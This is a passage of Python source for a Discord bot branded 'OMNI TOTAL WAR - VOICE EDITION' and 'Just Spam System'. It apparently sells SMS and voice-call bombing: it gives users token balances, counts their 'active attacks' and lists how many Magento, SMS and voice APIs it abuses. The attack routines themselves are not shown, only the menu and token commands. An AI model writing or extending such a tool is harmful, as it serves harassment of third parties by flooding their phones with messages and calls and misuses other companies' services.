    
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 200})
        tokens = 200
    else:
        tokens = user_doc.get("tokens", 0)
    
    active = len([a for a in bot.active_attacks if a.startswith(user_id) and bot.active_attacks[a]])
    
    embed = discord.Embed(
        title="⚡ **OMNI TOTAL WAR - VOICE EDITION**",
        description=f"**{len(MAGENTO_APIS)}** מג'נטו • **{len(SMS_APIS)}** SMS • **{len(VOICE_APIS)}** שיחות",
        color=0x00ff00,
        timestamp=datetime.now()
    )
    embed.add_field(name="💎 **הטוקנים שלך**", value=f"**{tokens}**", inline=True)
    embed.add_field(name="🎯 **מתקפות פעילות**", value=f"**{active}**", inline=True)
    embed.set_footer(text="Just Spam System")
    
    view = MainView()
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="tokens", description="💳 בדוק טוקנים")
async def tokens(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    tokens = user_doc.get("tokens", 0) if user_doc else 0
    
    embed = discord.Embed(
        title="💎 **TOKEN BALANCE**",
        color=0x5865F2,
        timestamp=datetime.now()
    )
    embed.add_field(name="👤 User", value=interaction.user.mention, inline=True)
    embed.add_field(name="💳 Balance", value=f"**{tokens}**", inline=True)
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

if __name__ == "__main__":
    logging.info("🚀 Starting OMNI TOTAL WAR VOICE EDITION...")
    bot.run(TOKEN)
